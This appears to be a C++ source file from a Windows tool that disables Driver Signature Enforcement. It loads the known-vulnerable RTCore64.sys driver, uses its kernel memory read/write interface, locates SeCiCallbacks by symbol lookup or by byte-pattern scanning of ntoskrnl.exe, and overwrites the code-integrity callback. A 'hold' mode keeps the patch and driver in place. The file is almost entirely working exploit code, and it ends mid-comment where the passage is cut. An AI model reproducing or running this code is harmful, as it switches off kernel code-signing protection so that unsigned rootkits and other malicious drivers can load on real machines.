#include "DrvCore.h"
#include "ConfigManager.h"
#include "ResourceInstaller.h"
#include "ArtifactCompat.h"
#include <iostream>
#include <vector>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "version.lib")


// ============================================================================
// SeCiCallbacks Pattern Scanner
// Needed on Windows builds where Microsoft strips the symbol from PDB.
// Strategy: ntoskrnl.exe imports CiInitialize from CI.dll. The function
// SepInitializeCodeIntegrity calls CiInitialize and passes &SeCiCallbacks
// as its second argument via: mov rdx, [rip+X]  ...  call [CiInitialize IAT]
// We scan the PE on disk to locate this pattern and extract the RVA.
// ============================================================================

static uint64_t ScanSeCiCallbacksFromDisk(const std::wstring& ntoskrnlPath) {
    HANDLE hFile = CreateFileW(ntoskrnlPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMap = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMap) { CloseHandle(hFile); return 0; }

    LPVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(hMap); CloseHandle(hFile); return 0; }

    uint64_t result = 0;

    auto cleanup = [&]() {
        UnmapViewOfFile(base);
        CloseHandle(hMap);
        CloseHandle(hFile);
    };

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { cleanup(); return 0; }

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { cleanup(); return 0; }

    WORD numSections = nt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);

    // Helper: RVA -> file offset
    auto rvaToOffset = [&](uint32_t rva) -> uint32_t {
        for (WORD i = 0; i < numSections; i++) {
            uint32_t va = sections[i].VirtualAddress;
            uint32_t sz = sections[i].Misc.VirtualSize;
            if (rva >= va && rva < va + sz)
                return sections[i].PointerToRawData + (rva - va);
        }
        return 0;
    };

    // Step 1: Find CiInitialize in the IAT
    uint32_t iatRva = 0;
    auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!importDir.VirtualAddress) { cleanup(); return 0; }

    uint32_t importOffset = rvaToOffset(importDir.VirtualAddress);
    if (!importOffset) { cleanup(); return 0; }

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)base + importOffset);
    for (; importDesc->Name; importDesc++) {
        uint32_t nameOffset = rvaToOffset(importDesc->Name);
        if (!nameOffset) continue;
        const char* dllName = (const char*)base + nameOffset;
        if (_stricmp(dllName, "CI.dll") != 0) continue;

        PIMAGE_THUNK_DATA64 origThunk = (PIMAGE_THUNK_DATA64)((BYTE*)base + rvaToOffset(importDesc->OriginalFirstThunk));
        PIMAGE_THUNK_DATA64 iatThunk  = (PIMAGE_THUNK_DATA64)((BYTE*)base + rvaToOffset(importDesc->FirstThunk));
        uint32_t iatEntryRva = importDesc->FirstThunk;

        for (; origThunk->u1.AddressOfData; origThunk++, iatThunk++, iatEntryRva += 8) {
            if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) continue;
            uint32_t hintOffset = rvaToOffset((uint32_t)(origThunk->u1.AddressOfData & 0xFFFFFFFF));
            if (!hintOffset) continue;
            const char* funcName = (const char*)base + hintOffset + 2;
            if (strcmp(funcName, "CiInitialize") == 0) {
                iatRva = iatEntryRva;
                break;
            }
        }
        if (iatRva) break;
    }

    if (!iatRva) { cleanup(); return 0; }

    // Step 2: Search all executable sections for: call qword ptr [rip+X] -> CiInitialize IAT
    // Encoding: FF 15 <rel32> where (instr_rva + 6 + rel32) == iatRva
    for (WORD si = 0; si < numSections; si++) {
        uint32_t secVa   = sections[si].VirtualAddress;
        uint32_t secSize = sections[si].SizeOfRawData;
        uint32_t secRaw  = sections[si].PointerToRawData;
        if (!secRaw || secSize < 6) continue;

        const BYTE* secData = (const BYTE*)base + secRaw;

        for (uint32_t off = 0; off + 6 <= secSize; off++) {
            if (secData[off] != 0xFF || secData[off+1] != 0x15) continue;
            int32_t rel = *(int32_t*)(secData + off + 2);
            uint32_t callRva = secVa + off;
            uint32_t targetRva = callRva + 6 + rel;
            if (targetRva != iatRva) continue;

            // Step 3: Scan backwards for the LEA instruction that loads &SeCiCallbacks
            // into a register before the CiInitialize call.
            //
            // Instruction encodings:
            //   lea rdx, [rip+Y]  -> 48 8D 15 <rel32>  (2nd arg - most common)
            //   lea rcx, [rip+Y]  -> 48 8D 0D <rel32>  (1st arg - some builds)
            //   lea r8,  [rip+Y]  -> 4C 8D 05 <rel32>  (3rd arg - seen on 26200+)
            //
            // IMPORTANT: On Windows 11 26200, SepInitializeCodeIntegrity sets up
            // arguments WELL above the call site (>0x100 bytes). We scan 0x500 bytes.
            //
            // Strategy: take the LAST (closest-to-call) data-section LEA in window.
            // This minimises false positives from unrelated LEA instructions.
            uint32_t scanBytes = 0x500;
            uint32_t scanStart = (callRva > scanBytes) ? callRva - scanBytes : 0;
            uint32_t scanOff   = (scanStart >= secVa)  ? (scanStart - secVa) : 0;

            uint32_t bestCandidate = 0;

            for (uint32_t j = scanOff; j + 7 <= off; j++) {
                bool isLeaRdx = (secData[j]==0x48 && secData[j+1]==0x8D && secData[j+2]==0x15);
                bool isLeaRcx = (secData[j]==0x48 && secData[j+1]==0x8D && secData[j+2]==0x0D);
                bool isLeaR8  = (secData[j]==0x4C && secData[j+1]==0x8D && secData[j+2]==0x05);
                if (!isLeaRdx && !isLeaRcx && !isLeaR8) continue;

                int32_t  leaRel  = *(int32_t*)(secData + j + 3);
                uint32_t leaRva  = secVa + j;
                uint32_t seCiRva = leaRva + 7 + leaRel;

                // Must resolve into a writable data area (not .text/.PAGE code)
                // Typical range for ntoskrnl data: 0x100000 - 0x3000000
                if (seCiRva > 0x100000 && seCiRva < 0x3000000) {
                    bestCandidate = seCiRva; // last match = closest to call
                }
            }

            if (bestCandidate) {
                result = bestCandidate;
                break; // found it at this call site — done
            }
            // No LEA found near this call site — try the next CiInitialize call site
        }
        if (result) break;
    }

    // ---- Exhaustive Fallback (Build 26200+ where call setup is far away) ----
    // If no LEA was found within 0x500 bytes of any CiInitialize call, scan the
    // ENTIRE executable section: collect every CiInitialize call site RVA, then
    // every data-section LEA rdx/rcx/r8 RVA, and pair the LEA that is closest
    // (but still BEFORE) a call site.
    if (!result) {
        for (WORD si = 0; si < numSections && !result; si++) {
            uint32_t secVa   = sections[si].VirtualAddress;
            uint32_t secSize = sections[si].SizeOfRawData;
            uint32_t secRaw  = sections[si].PointerToRawData;
            if (!secRaw || secSize < 7) continue;

            const BYTE* secData = (const BYTE*)base + secRaw;

            // Collect all CiInitialize call sites in this section
            std::vector<uint32_t> callSites;
            for (uint32_t off = 0; off + 6 <= secSize; off++) {
                if (secData[off] != 0xFF || secData[off+1] != 0x15) continue;
                int32_t rel = *(int32_t*)(secData + off + 2);
                uint32_t callRva = secVa + off;
                if ((callRva + 6 + rel) == iatRva)
                    callSites.push_back(callRva);
            }
            if (callSites.empty()) continue;

            // Collect all data-section LEA candidates in this section
            // For each, record: { leaRva, seCiCandidateRva }
            struct LeaCandidate { uint32_t leaRva; uint32_t dataRva; };
            std::vector<LeaCandidate> leas;
            for (uint32_t j = 0; j + 7 <= secSize; j++) {
                bool isLeaRdx = (secData[j]==0x48 && secData[j+1]==0x8D && secData[j+2]==0x15);
                bool isLeaRcx = (secData[j]==0x48 && secData[j+1]==0x8D && secData[j+2]==0x0D);
                bool isLeaR8  = (secData[j]==0x4C && secData[j+1]==0x8D && secData[j+2]==0x05);
                if (!isLeaRdx && !isLeaRcx && !isLeaR8) continue;

                int32_t  rel     = *(int32_t*)(secData + j + 3);
                uint32_t leaRva  = secVa + j;
                uint32_t dataRva = leaRva + 7 + rel;
                if (dataRva > 0x100000 && dataRva < 0x3000000)
                    leas.push_back({ leaRva, dataRva });
            }
            if (leas.empty()) continue;

            // For each call site, find the LEA immediately before it (max distance: no limit)
            uint32_t bestDist = 0xFFFFFFFF;
            for (uint32_t callRva : callSites) {
                for (auto& lc : leas) {
                    if (lc.leaRva >= callRva) continue; // must be before call
                    uint32_t dist = callRva - lc.leaRva;
                    if (dist < bestDist) {
                        bestDist = dist;
                        result   = lc.dataRva;
                    }
                }
            }
        }
    }

    cleanup();
    return result;
}

bool DrvLoader::Initialize() {
    originalCallbacks = ConfigManager::LoadOriginalCallbacksFromRegistry();
    if (!originalCallbacks.empty()) {
        // ------------------------------------------------------------------
        // STALE-STATE DETECTION (added for ARTIFACT compatibility)
        //
        // The registry survives reboots, the kernel patch does not.  When the
        // recorded state was written by an earlier boot, there is nothing to
        // restore: SeCiCallbacks already holds the real CI pointers, and
        // replaying the stored values plants a dangling address in the table.
        // On this machine that is exactly how `restore` produced a BSOD.
        // Drop the state instead of pretending we can undo the patch.
        // ------------------------------------------------------------------
        if (ArtifactCompat::IsPatchStateFromCurrentBoot()) {
            std::wcout << L"[+] Found previous patch state in registry ("
                       << originalCallbacks.size() << L" callbacks, same boot)\n";
        } else {
            std::wcout << L"[!] Registry holds patch state from a PREVIOUS boot ("
                       << originalCallbacks.size() << L" callbacks)\n";
            std::wcout << L"[!] Discarding it: the kernel callbacks were reset by the restart,\n";
            std::wcout << L"[!] so replaying those addresses would corrupt SeCiCallbacks.\n";
            originalCallbacks.clear();
            ConfigManager::ClearPatchStateFromRegistry();
            ArtifactCompat::ClearPatchBootStamp();
        }
    } else {
        std::wcout << L"[*] No previous patch state found\n";
    }
    
    if (!symbolDownloader.Initialize()) {
        std::wcout << L"[-] Failed to initialize symbol downloader\n";
        return false;
    }
    
    return true;
}

DrvLoader::~DrvLoader() {
    // ------------------------------------------------------------------
    // Only undo what THIS process did.
    //
    // Upstream restored whenever `originalCallbacks` was non-empty, which is
    // fine when DrvLoader is the only party involved — but `Initialize()`
    // seeds originalCallbacks from HKCU for *every* command, including
    // `status`, `compat` and `help`.  With ARTIFACT's hold mode that means any
    // harmless read-only command silently tears down a DSE hold established by
    // a *different* process, and destroys the only record of the original
    // callback values while doing it (observed: `hold` then `status` =>
    // "[*] DrvLoader shutting down, auto-restoring DSE...").
    //
    // `patchedCallbackAddr` is set only by BypassDSEInternal(), i.e. only by a
    // process that really wrote to the CI table.  Use that as the trigger.
    // ------------------------------------------------------------------
    bool patchedByThisProcess = patchedCallbackAddr.has_value();

    if (patchedByThisProcess && !holdMode) {
        std::wcout << L"\n[*] DrvLoader shutting down, auto-restoring DSE...\n";
        RestoreDSE();
    }
    else if (patchedByThisProcess && holdMode) {
        std::wcout << L"[*] Hold mode: leaving DSE patched and RTCore64 loaded\n";
    }
    else if (!originalCallbacks.empty()) {
        std::wcout << L"[*] Patch state belongs to another process - leaving it untouched\n";
    }
    Cleanup();
}

void DrvLoader::Cleanup() {
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }
}

bool DrvLoader::WriteMemory32(uint64_t address, uint32_t value) {
    if (hDriver == INVALID_HANDLE_VALUE) return false;
    
    RTC_MEMORY_WRITE writePacket{};
    writePacket.Address = address;
    writePacket.Size = sizeof(uint32_t);
    writePacket.Value = value;
    
    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_WRITE, &writePacket, sizeof(writePacket), 
                          &writePacket, sizeof(writePacket), &bytesReturned, nullptr)) {
        return true;
    }
    std::wcout << L"[-] RTCore64 write IOCTL failed. Error: " << GetLastError() << L"\n";
    return false;
}

bool DrvLoader::WriteMemory64(uint64_t address, uint64_t value) {
    if (hDriver == INVALID_HANDLE_VALUE) return false;

    // ---- Attempt 1: single 8-byte write (RTCore64 supports Size=8) ----
    // This is atomic from the kernel's perspective and avoids the
    // two-write race window that PatchGuard can trigger on.
    {
        RTC_MEMORY_WRITE pkt{};
        pkt.Address = address;
        pkt.Size    = sizeof(uint64_t); // 8
        // RTCore64 internal write handler reads Value as ULONG64 when Size==8
        // Store value in the Value field, but the driver reads it as 64-bit
        // from the same offset — copy the full 8 bytes into Value+padding area.
        // Layout: Pad0[8] | Address[8] | Pad1[8] | Size[4] | Value[4] | Pad3[16]
        // For Size==8 the driver reads *((PULONG64)&pkt.Value)
        *reinterpret_cast<uint64_t*>(&pkt.Value) = value;
        DWORD bytesReturned = 0;
        if (DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_WRITE,
                            &pkt, sizeof(pkt), &pkt, sizeof(pkt),
                            &bytesReturned, nullptr)) {
            return true;
        }
        std::wcout << L"[-] RTCore64 write IOCTL (64-bit) failed. Error: " << GetLastError() << L"\n";
    }

    // ---- Fallback: two 32-bit writes (old RTCore64 versions) ----
    // Less safe, but works on older RTCore builds.
    return WriteMemory32(address,     static_cast<uint32_t>( value        & 0xFFFFFFFF)) &&
           WriteMemory32(address + 4, static_cast<uint32_t>((value >> 32) & 0xFFFFFFFF));
}

std::optional<uint32_t> DrvLoader::ReadMemory32(uint64_t address) {
    if (hDriver == INVALID_HANDLE_VALUE) return std::nullopt;
    
    RTC_MEMORY_READ readPacket{};
    readPacket.Address = address;
    readPacket.Size = sizeof(uint32_t);
    
    DWORD bytesReturned = 0;
    if (!DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_READ, &readPacket, sizeof(readPacket), 
                        &readPacket, sizeof(readPacket), &bytesReturned, nullptr))
        return std::nullopt;
    
    return readPacket.Value;
}

std::optional<uint64_t> DrvLoader::ReadMemory64(uint64_t address) {
    auto low = ReadMemory32(address);
    auto high = ReadMemory32(address + 4);
    if (!low || !high) return std::nullopt;
    
    return (static_cast<uint64_t>(*high) << 32) | *low;
}

std::optional<uint64_t> DrvLoader::GetNtoskrnlBase() {
    std::vector<LPVOID> drivers(1024);
    DWORD needed = 0;
    
    if (!EnumDeviceDrivers(drivers.data(), static_cast<DWORD>(drivers.size() * sizeof(LPVOID)), &needed))
        return std::nullopt;
    
    drivers.resize(needed / sizeof(LPVOID));
    
    for (const auto& driver : drivers) {
        WCHAR driverName[MAX_PATH];
        if (GetDeviceDriverBaseNameW(driver, driverName, MAX_PATH) && wcscmp(driverName, L"ntoskrnl.exe") == 0) {
            return reinterpret_cast<uint64_t>(driver);
        }
    }
    
    return std::nullopt;
}

std::optional<std::pair<uint64_t, uint64_t>> DrvLoader::GetTextSectionBounds(const std::wstring& ntoskrnlPath) {
    HANDLE hFile = CreateFileW(ntoskrnlPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        return std::nullopt;
    }
    
    HANDLE hMapping = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMapping) {
        CloseHandle(hFile);
        return std::nullopt;
    }
    
    LPVOID pBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return std::nullopt;
    }
    
    std::optional<std::pair<uint64_t, uint64_t>> result;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pBase + pDos->e_lfanew);
        if (pNt->Signature == IMAGE_NT_SIGNATURE) {
            PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
            
            for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
                char sectionName[9] = {0};
                memcpy(sectionName, pSection[i].Name, 8);
                
                if (strcmp(sectionName, ".text") == 0) {
                    uint64_t textStart = pSection[i].VirtualAddress;
                    uint64_t textEnd = textStart + pSection[i].Misc.VirtualSize;
                    result = {textStart, textEnd};
                    break;
                }
            }
        }
    }
    
    UnmapViewOfFile(pBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    
    return result;
}

bool DrvLoader::ValidateKernelAddresses(uint64_t ntBase, uint64_t seCiRva, uint64_t zwRva) {
    WCHAR systemRoot[MAX_PATH];
    GetSystemDirectoryW(systemRoot, MAX_PATH);
    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
    
    // Get .text section bounds
    auto textBounds = GetTextSectionBounds(ntoskrnlPath);
    if (!textBounds) {
        std::wcout << L"[-] Failed to read .text section from ntoskrnl.exe\n";
        return false;
    }
    
    auto [textStart, textEnd] = *textBounds;
    
    // Validate ZwFlushInstructionCache is in .text section
    if (zwRva < textStart || zwRva >= textEnd) {
        std::wcout << L"[-] ZwFlushInstructionCache offset 0x" << std::hex << zwRva 
                   << L" is outside .text section [0x" << textStart << L"-0x" << textEnd << L"]\n" << std::dec;
        return false;
    }
    
    std::wcout << L"[+] ZwFlushInstructionCache validated in .text section\n";
    
    // Validate SeCiCallbacks structure base is readable.
    // We probe offset +0 (the structure header) — NOT +0x20, which is a
    // build-specific assumption.  The actual callback slot is located later
    // by FindCallbackOffset() which scans the live structure dynamically.
    uint64_t seCiCallbacks = ntBase + seCiRva;

    auto testRead = ReadMemory64(seCiCallbacks);
    if (!testRead) {
        std::wcout << L"[-] Cannot read SeCiCallbacks base at 0x"
                   << std::hex << seCiCallbacks << std::dec << L"\n";
        std::wcout << L"[-] Address may be invalid or driver primitives not working\n";
        return false;
    }

    std::wcout << L"[+] SeCiCallbacks address validated (readable)\n";
    
    return true;
}

std::optional<std::pair<uint64_t, uint64_t>> DrvLoader::ResolveKernelOffsetsStrict() {
    // If we have both offsets cached in memory, use them immediately to save time
    if (cachedSeCiOffset && cachedZwFlushOffset) {
        return std::make_pair(*cachedSeCiOffset, *cachedZwFlushOffset);
    }

    WCHAR systemRoot[MAX_PATH];
    GetSystemDirectoryW(systemRoot, MAX_PATH);
    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
    
    std::wcout << L"[*] Strict offset resolution from PDB...\n";
    
    // Get PDB GUID from current ntoskrnl.exe
    auto [pdbName, pdbGuid] = symbolDownloader.GetPdbInfoFromPe(ntoskrnlPath);
    if (pdbGuid.empty()) {
        std::wcout << L"[-] Failed to extract PDB GUID from ntoskrnl.exe\n";
        return std::nullopt;
    }
    
    std::wcout << L"[+] Current kernel PDB GUID: " << pdbGuid << L"\n";
    
    // Ensure symbols exist in ProgramData store (download if needed)
    if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
        std::wcout << L"[-] Failed to obtain PDB symbols\n";
        return std::nullopt;
    }
    
    // Resolve symbols from PDB
    auto seCiOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
    if (!seCiOpt) {
        seCiOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"g_CiCallbacks");
    }
    if (!seCiOpt) {
        seCiOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SepCiCallbacks");
    }

    // PDB symbols stripped on recent Windows builds - fall back to PE pattern scan
    if (!seCiOpt) {
        std::wcout << L"[*] PDB symbols stripped - using PE pattern scanner...\n";
        uint64_t scanned = ScanSeCiCallbacksFromDisk(ntoskrnlPath);
        if (scanned != 0) {
            std::wcout << L"[+] Pattern scan found SeCiCallbacks at RVA: 0x"
                       << std::hex << scanned << std::dec << L"\n";
            seCiOpt = scanned;
        } else {
            std::wcout << L"[-] Pattern scan failed to locate SeCiCallbacks\n";
        }
    }

    auto zwOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
    
    if (!seCiOpt || !zwOpt) {
        std::wcout << L"[-] Failed to resolve required symbols from PDB\n";
        return std::nullopt;
    }
    
    std::wcout << L"[+] Resolved offsets from PDB:\n";
    std::wcout << L"    SeCiCallbacks: 0x" << std::hex << *seCiOpt << std::dec << L"\n";
    std::wcout << L"    ZwFlushInstructionCache: 0x" << std::hex << *zwOpt << std::dec << L"\n";
    
    // Cache the resolved offsets for future calls
    cachedSeCiOffset = *seCiOpt;
    cachedZwFlushOffset = *zwOpt;
    
    return std::make_pair(*seCiOpt, *zwOpt);
}

bool DrvLoader::GetSymbolOffsets(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
    auto offsets = ResolveKernelOffsetsStrict();
    if (!offsets) {
        return false;
    }
    
    *seCiCallbacks = offsets->first;
    *safeFunction = offsets->second;
    
    return true;
}

std::optional<uint64_t> DrvLoader::GetKernelSymbolOffset(const std::wstring& symbolName) {
    WCHAR systemRoot[MAX_PATH];
    GetSystemDirectoryW(systemRoot, MAX_PATH);
    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
    
    if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
        return std::nullopt;
    }
    
    return symbolDownloader.GetSymbolOffset(ntoskrnlPath, symbolName);
}

bool DrvLoader::CheckDriverFileExists() {
    std::wstring driverPath = ConfigManager::GetDriverPath();
    if (GetFileAttributesW(driverPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::wcout << L"[*] Installing driver from embedded resource...\n";
        if (!ResourceInstaller::InstallDriverFromResource()) return false;
        
        if (GetFileAttributesW(driverPath.c_str()) == INVALID_FILE_ATTRIBUTES) return false;
    }
    return true;
}

// True when the given kernel-driver service exists (regardless of state).
bool DrvLoader::DriverServiceExists(const std::wstring& serviceName) {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_QUERY_STATUS);
    bool exists = (hService != nullptr);
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return exists;
}

bool DrvLoader::StopAndRemoveDriver() {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"RTCore64", SERVICE_ALL_ACCESS);
    if (hService) {
        SERVICE_STATUS serviceStatus;
        ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
        DeleteService(hService);
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCM);
    return true;
}

bool DrvLoader::InstallAndStartDriver() {
    // If we already have a valid handle, check if it's still alive
    if (hDriver != INVALID_HANDLE_VALUE) {
        // Try a simple read to verify the driver is responsive
        if (ReadMemory32(0)) { 
            return true; 
        }
        // Handle is stale, close it
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }

    if (!CheckDriverFileExists()) return false;
    StopAndRemoveDriver();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;
    
    std::wstring driverPath = L"System32\\drivers\\RTCore64.sys";
    std::wstring serviceName = L"RTCore64";
    DWORD startType = SERVICE_SYSTEM_START;

    SC_HANDLE hService = CreateServiceW(
        hSCM, serviceName.c_str(), serviceName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        startType, SERVICE_ERROR_NORMAL,
        driverPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
        } else {
            std::wcout << L"[-] Failed to create service. Error: " << err << L"\n";
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    if (!hService) {
        std::wcout << L"[-] Failed to open service handle. Error: " << GetLastError() << L"\n";
        CloseServiceHandle(hSCM);
        return false;
    }

    bool success = StartServiceW(hService, 0, nullptr);
    if (!success) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            success = true;
        } else {
            std::wcout << L"[-] Failed to start service. Error: 0x" << std::hex << err << std::dec << L"\n";
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

// ---------------------------------------------------------------------------
// ReadDSEOnly
//
// Pure-read DSE inspection.  Never installs, uninstalls or patches anything.
// This is the only safe way to query the live state while a `hold` is in
// effect: `status` necessarily installs RTCore64 (if absent) and its own
// destructor restores DSE, so running `status` after `hold` silently undoes
// the hold.  Verified on this machine: `hold` then `status` => DSE back to
// ACTIVE and the registry cleared.
//
// Returns:
//   true  -> isPatched is filled in
//   false -> could not read (RTCore64 absent, symbols unavailable, ...)
// ---------------------------------------------------------------------------
bool DrvLoader::ReadDSEOnly(bool& isPatched) {
    // Requires an already-open handle; do not create one.
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] RTCore64 is not open; nothing to read\n";
        return false;
    }

    auto offsets = ResolveKernelOffsetsStrict();
    if (!offsets) {
        std::wcout << L"[-] Failed to resolve kernel offsets\n";
        return false;
    }
    auto [seCiOffset, zwFlushOffset] = *offsets;

    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to get ntoskrnl.exe base\n";
        return false;
    }

    if (!ValidateKernelAddresses(*ntBase, seCiOffset, zwFlushOffset)) {
        std::wcout << L"[-] Address validation failed\n";
        return false;
    }

    uint64_t seCiCallbacks = *ntBase + seCiOffset;
    uint64_t safeFunction  = *ntBase + zwFlushOffset;

    auto cbOff = FindCallbackOffset(seCiCallbacks, *ntBase);
    if (!cbOff) {
        std::wcout << L"[-] Could not locate CI callback slot\n";
        return false;
    }

    auto current = ReadMemory64(seCiCallbacks + *cbOff);
    if (!current) {
        std::wcout << L"[-] Could not read CI callback slot\n";
        return false;
    }

    isPatched = (*current == safeFunction);
    std::wcout << L"    Current callback: 0x" << std::hex << *current << L"\n";
    std::wcout << L"    Safe function:    0x" << safeFunction << std::dec << L"\n";
    return true;
}

bool DrvLoader::CheckDSEStatus(bool& isPatched) {
    std::wcout << L"\n[=== Checking DSE Status ===]\n\n";

    // ------------------------------------------------------------------
    // Don't disturb an existing hold.
    //
    // Upstream's flow was InstallAndStartDriver() -> read -> StopAndRemoveDriver(),
    // i.e. it (re)installed RTCore64 and then unloaded it again.  When a hold
    // is active that sequence tears the helper driver out from under the live
    // patch.  Reuse the handle if we already have one, and never unload a
    // driver that was already running when we arrived.
    // ------------------------------------------------------------------
    bool driverWasAlreadyLoaded = DriverServiceExists(L"RTCore64");

    // Strict resolution - no cache
    auto offsets = ResolveKernelOffsetsStrict();
    if (!offsets) {
        std::wcout << L"[-] Failed to resolve kernel offsets\n";
        return false;
    }
    
    auto [seCiCallbacksOffset, zwFlushOffset] = *offsets;
    
    if (hDriver == INVALID_HANDLE_VALUE) {
        if (!InstallAndStartDriver()) return false;
        hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hDriver == INVALID_HANDLE_VALUE) {
            if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
            return false;
        }
    }
    
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to get ntoskrnl.exe base\n";
        Cleanup();
        if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[+] ntoskrnl.exe base: 0x" << std::hex << *ntBase << std::dec << L"\n";
    
    // Validate addresses before checking status
    if (!ValidateKernelAddresses(*ntBase, seCiCallbacksOffset, zwFlushOffset)) {
        std::wcout << L"[-] Address validation failed - offsets may be incorrect\n";
        Cleanup();
        if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
        return false;
    }
    
    uint64_t seCiCallbacks = *ntBase + seCiCallbacksOffset;
    uint64_t safeFunction  = *ntBase + zwFlushOffset;

    // Dynamically locate the callback slot — never hardcode +0x20
    auto cbOff = FindCallbackOffset(seCiCallbacks, *ntBase);
    if (!cbOff) {
        std::wcout << L"[-] Could not locate CI callback slot\n";
        Cleanup();
        if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
        return false;
    }
    uint64_t callbackAddress = seCiCallbacks + *cbOff;

    auto currentCallback = ReadMemory64(callbackAddress);
    if (!currentCallback) {
        Cleanup();
        if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
        return false;
    }

    isPatched = (*currentCallback == safeFunction);

    std::wcout << L"[+] DSE Status: " << (isPatched ? L"PATCHED" : L"ACTIVE") << L"\n";
    std::wcout << L"    Current callback: 0x" << std::hex << *currentCallback << L"\n";
    std::wcout << L"    Safe function: 0x" << safeFunction << std::dec << L"\n";

    // Report the boot-scoped state so callers can tell "live patch" from
    // "stale registry record left over from an earlier boot".
    if (!originalCallbacks.empty()) {
        std::wcout << L"    Patch record   : "
                   << (ArtifactCompat::IsPatchStateFromCurrentBoot() ? L"this boot (live)"
                                                                    : L"previous boot (stale)")
                   << L"\n";
    }
    
    // Update configuration files with validated offsets
    ConfigManager::UpdateDriversIni(seCiCallbacksOffset, zwFlushOffset);
    std::wstring buildInfo = ConfigManager::GetWindowsBuildNumber();
    ConfigManager::SaveOffsetsToRegistry(seCiCallbacksOffset, zwFlushOffset, buildInfo);
    
    // A hold keeps the helper driver loaded on purpose: leave it alone.
    if (!holdMode && !driverWasAlreadyLoaded) {
        Cleanup();
        StopAndRemoveDriver();
    } else {
        std::wcout << L"[*] RTCore64 left loaded (hold active or pre-existing)\n";
    }
    return true;
}

// ---------------------------------------------------------------------------
// FindCallbackOffset
// Scans the live SeCiCallbacks structure (up to 0x100 bytes) for the first
